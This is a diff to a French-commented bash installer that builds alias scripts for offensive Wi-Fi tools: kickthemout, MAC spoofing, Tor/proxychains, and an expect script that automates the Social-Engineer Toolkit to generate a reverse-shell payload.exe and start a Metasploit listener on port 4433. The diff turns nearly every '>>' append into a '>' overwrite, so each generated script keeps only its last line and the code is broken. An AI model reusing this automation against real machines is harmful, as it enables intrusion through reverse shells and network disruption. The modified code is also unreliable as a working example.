@@ -23,9 +23,9 @@ if [ $var1 = "Y" ] || [ $var1 = "y" ]
 then
 cd "/$USERNAME/Scripts"
 touch kick
-echo cd /$USERNAME/Scripts/kickthemout >> kick
-echo python kickthemout.py >> kick
-echo cd \~ >> kick
+echo cd /$USERNAME/Scripts/kickthemout > kick
+echo python kickthemout.py > kick
+echo cd \~ > kick
 #echo "alias kick='cd /$USERNAME/Scripts ; ./kick ; cd ~' " >> /$USERNAME/.bashrc
 grep -q -F "alias kick='cd /$USERNAME/Scripts ; ./kick ; cd ~' " /$USERNAME/.bashrc || echo "alias kick='cd /$USERNAME/Scripts ; ./kick ; cd ~' " >> /$USERNAME/.bashrc
 
@@ -49,21 +49,21 @@ if [ $var2 = "Y" ] || [ $var2 = "y" ]
 then
 cd "/$USERNAME/Scripts"
 touch Mac
-echo 'service network-manager stop ; sleep 5' >> Mac
-echo 'ifconfig wlan0 down' >> Mac
-echo 'macchanger -r -A wlan0 ; sleep 5' >> Mac
-echo 'ifconfig wlan0 up ; sleep 5' >> Mac
-echo 'service network-manager start' >> Mac
+echo 'service network-manager stop ; sleep 5' > Mac
+echo 'ifconfig wlan0 down' > Mac
+echo 'macchanger -r -A wlan0 ; sleep 5' > Mac
+echo 'ifconfig wlan0 up ; sleep 5' > Mac
+echo 'service network-manager start' > Mac
 grep -q -F "alias Mac='cd /$USERNAME/Scripts ; ./Mac ; cd ~' " /$USERNAME/.bashrc || echo "alias Mac='cd /$USERNAME/Scripts ; ./Mac ; cd ~' " >> /$USERNAME/.bashrc
 
 cd "/$USERNAME/Scripts"
 touch Macchanger.sh
-echo '#!/bin/bash' >> Macchanger.sh
-echo 'ifconfig wlan0 down' >> Macchanger.sh
-echo 'sleep 2' >> Macchanger.sh
-echo 'macchanger -r -A wlan0' >> Macchanger.sh
-echo 'sleep 2' >> Macchanger.sh
-echo 'ifconfig wlan0 up' >> Macchanger.sh
+echo '#!/bin/bash' > Macchanger.sh
+echo 'ifconfig wlan0 down' > Macchanger.sh
+echo 'sleep 2' > Macchanger.sh
+echo 'macchanger -r -A wlan0' > Macchanger.sh
+echo 'sleep 2' > Macchanger.sh
+echo 'ifconfig wlan0 up' > Macchanger.sh
 grep -q -F "alias Mac2='cd /$USERNAME/Scripts ; ./Macchanger.sh ; cd ~' " /$USERNAME/.bashrc || echo "alias Mac2='cd /$USERNAME/Scripts ; ./Macchanger.sh ; cd ~' " >> /$USERNAME/.bashrc
 
 apt-get -y install macchanger
@@ -84,14 +84,14 @@ if [ $var3 = "Y" ] || [ $var3 = "y" ]
 then
 cd "/$USERNAME/Scripts"
 touch proxyon
-echo service tor start >> proxyon
-echo /etc/init.d/tor start >> proxyon
-echo proxychains firefox www.duckduckgo.com >> proxyon
+echo service tor start > proxyon
+echo /etc/init.d/tor start > proxyon
+echo proxychains firefox www.duckduckgo.com > proxyon
 
 cd "/$USERNAME/Scripts"
 touch proxyoff
-echo service tor stop >> proxyoff
-echo /etc/init.d/tor stop >> proxyoff
+echo service tor stop > proxyoff
+echo /etc/init.d/tor stop > proxyoff
 
 apt-get -y install tor proxychains
 grep -q -F "alias proxyon='cd /$USERNAME/Scripts ; ./proxyon ; cd ~' " /$USERNAME/.bashrc || echo "alias proxyon='cd /$USERNAME/Scripts ; ./proxyon ; cd ~' " >> /$USERNAME/.bashrc
@@ -114,8 +114,8 @@ if [ $var4 = "Y" ] || [ $var4 = "y" ]
 then
 cd "/$USERNAME/Scripts"
 touch tor2
-echo cd /$USERNAME/Scripts/tor-browser_en-US/Browser >> tor2
-echo ./start-tor-browser >> tor2
+echo cd /$USERNAME/Scripts/tor-browser_en-US/Browser > tor2
+echo ./start-tor-browser > tor2
 #echo "alias tor2='cd /$USERNAME/Scripts ; ./tor2 ; cd ~' " >> /$USERNAME/.bashrc
 grep -q -F "alias tor2='cd /$USERNAME/Scripts ; ./tor2 ; cd ~' " /$USERNAME/.bashrc || echo "alias tor2='cd /$USERNAME/Scripts ; ./tor2 ; cd ~' " >> /$USERNAME/.bashrc
 
@@ -158,10 +158,10 @@ clear
 #cd "/$USERNAME/Scripts"
 #touch Virus
 #echo echo Quelle repertoire voulez-vous scanner ? \(\/,\/etc\/apt\/,\/root\/,..\)
-#echo read rep >> Virus
-#echo cd \$rep >> Virus
-#echo clamscan -r >> Virus
-#echo cd \~ >> Virus
+#echo read rep > Virus
+#echo cd \$rep > Virus
+#echo clamscan -r > Virus
+#echo cd \~ > Virus
 #echo "alias virus='cd /$USERNAME/Scripts ; ./Virus ; cd ~' " >> /$USERNAME/.bashrc
 
 
@@ -183,47 +183,47 @@ read var6
 
 if [ $var6 = "Y" ] || [ $var6 = "y" ]
 then
-echo '#!/bin/bash' >> set
-echo ip\=\"\$\(ifconfig wlan0 \|sed -n \'2p\'\| awk \'\{print \$2\}\'\)\" >> set
-echo 'echo $ip > @ip' >> set
-echo ./set2 >> set
+echo '#!/bin/bash' > set
+echo ip\=\"\$\(ifconfig wlan0 \|sed -n \'2p\'\| awk \'\{print \$2\}\'\)\" > set
+echo 'echo $ip > @ip' > set
+echo ./set2 > set
 
-echo '#!/usr/bin/expect' >> set2
-echo set ip [exec cat @ip] >> set2
+echo '#!/usr/bin/expect' > set2
+echo set ip [exec cat @ip] > set2
 
-echo set timeout 5 >> set2
+echo set timeout 5 > set2
 
-echo spawn \"setoolkit\" >> set2
-echo set timeout 2 >> set2
+echo spawn \"setoolkit\" > set2
+echo set timeout 2 > set2
 
-echo expect \"set\>\" >> set2
-echo send -- \"1\\r\" >> set2
+echo expect \"set\>\" > set2
+echo send -- \"1\\r\" > set2
+echo set timeout 2 > set2
+echo expect \"set\>\" > set2
+echo send -- \"4\\r\" > set2
+echo set timeout 2 > set2
+echo expect \"set:payloads\>\" > set2
+echo send -- \"2\\r\" > set2
 echo set timeout 2 >> set2
-echo expect \"set\>\" >> set2
-echo send -- \"4\\r\" >> set2
-echo set timeout 2 >> set2
-echo expect \"set:payloads\>\" >> set2
-echo send -- \"2\\r\" >> set2
-echo set timeout 2 >> set2
-echo expect \"\(LHOST\):\" >> set2
-echo send -- \"\$ip\\r\" >> set2
-echo set timeout 2 >> set2
-echo expect \"reverse listener:\" >> set2
-echo send -- \"4433\\r\" >> set2
-echo set timeout 5 >> set2
-echo expect \"\(yes/no\)\" >> set2
-echo send -- \"yes\\r\" >> set2
-echo set timeout 10 >> set2
-echo expect \"msf exploit\(handler\) \> \" >> set2
-echo send -- \"exploit\" >> set2
-echo set timeout 10 >> set2
-echo system \"mv /root/.set//payload.exe /root/payload.exe\" >> set2
-echo system \"rm @ip\" >> set2
-echo interact >> set2
+echo expect \"\(LHOST\):\" > set2
+echo send -- \"\$ip\\r\" > set2
+echo set timeout 2 > set2
+echo expect \"reverse listener:\" > set2
+echo send -- \"4433\\r\" > set2
+echo set timeout 5 > set2
+echo expect \"\(yes/no\)\" > set2
+echo send -- \"yes\\r\" > set2
+echo set timeout 10 > set2
+echo expect \"msf exploit\(handler\) \> \" > set2
+echo send -- \"exploit\" > set2
+echo set timeout 10 > set2
+echo system \"mv /root/.set//payload.exe /root/payload.exe\" > set2
+echo system \"rm @ip\" > set2
+echo interact > set2
 #echo "alias set2='cd /$USERNAME/Scripts ; ./set ; cd ~' " >> /$USERNAME/.bashrc
 grep -q -F "alias set2='cd /$USERNAME/Scripts ; ./set ; cd ~' " /$USERNAME/.bashrc || echo "alias set2='cd /$USERNAME/Scripts ; ./set ; cd ~' " >> /$USERNAME/.bashrc
 else 
-echo "C'est toi qui voit" 
+echo "C'est toi qui decide" 
 fi
 
 #scan wifi
@@ -236,9 +236,9 @@ echo Creer le script My_IP ?
 var7="/$USERNAME/Scripts/My_IP"
 if [ ! -f "$var7" ]
 then
-echo '#!/bin/bash' >> My_IP
-echo ip\=\"\$\(ifconfig wlan0 \|sed -n \'2p\'\| awk \'\{print \$2\}\'\)\" >> My_IP
-echo echo \$ip >> My_IP
+echo '#!/bin/bash' > My_IP
+echo ip\=\"\$\(ifconfig wlan0 \|sed -n \'2p\'\| awk \'\{print \$2\}\'\)\" > My_IP
+echo echo \$ip > My_IP
 else
 echo All ready Exist
 fi
